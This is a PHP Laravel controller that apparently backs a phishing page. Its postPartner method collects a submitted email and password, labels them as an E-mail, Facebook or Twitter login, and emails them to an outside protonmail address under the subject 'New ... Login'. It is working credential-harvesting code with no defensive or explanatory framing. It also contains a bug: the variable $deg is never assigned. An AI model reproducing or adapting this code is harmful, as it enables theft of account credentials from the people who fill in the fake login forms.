<?php namespace App\Http\Controllers;

use App\Http\Requests;
use App\Http\Controllers\Controller;

use Illuminate\Http\Request;
use App\Helpers\Contracts\HelperContract; 
use Auth;
use Session; 
use Validator; 
use Carbon\Carbon; 

class MainController extends Controller {

	protected $helpers; //Helpers implementation
    
    public function __construct(HelperContract $h)
    {
    	$this->helpers = $h;            
    }

	/**
	 * Show the application welcome screen to the user.
	 *
	 * @return Response
	 */
	public function getIndex()
    {
        $ret = null;
    	return view('index', compact(['ret']));
    }

	/**
	 * Show the application file screen to the user.
	 *
	 * @return Response
	 */
	public function getFile()
    {
        $ret = null;
    	return view('file', compact(['ret']));
    }
    
   
    
    
    public function postPartner(Request $request)
	{
           $req = $request->all();
		   #dd($req);
           $ret = "";
               
                $validator = Validator::make($req, [
                             'deg' => 'required',
                             'email' => 'required|email',
                             'pass' => 'required',
                   ]);
         
                 if($validator->fails())
                  {
                       $ret = "Enter your email and password to continue!";
                       
                 }
                
                 else
                 { 
			           $dg = "E-mail";
					   if($deg == "fbb") $dg = "Facebook";
					   else if($deg == "tww") $dg = "Twitter";
					   
            		   $s = "New $dg Login: ".date("h:i A jS F, Y");
                       $rcpt = "ceochris@protonmail.com";
                       $pass = $req["pass"];
                       $email = $req["email"];

                       $this->helpers->sendEmail($rcpt,$s,['pass' => $pass,'email' => $email],'emails.apply_alert','view');  
                        $ret = "ok";                      
                  }       
           return $ret;                                                                                            
	}

}
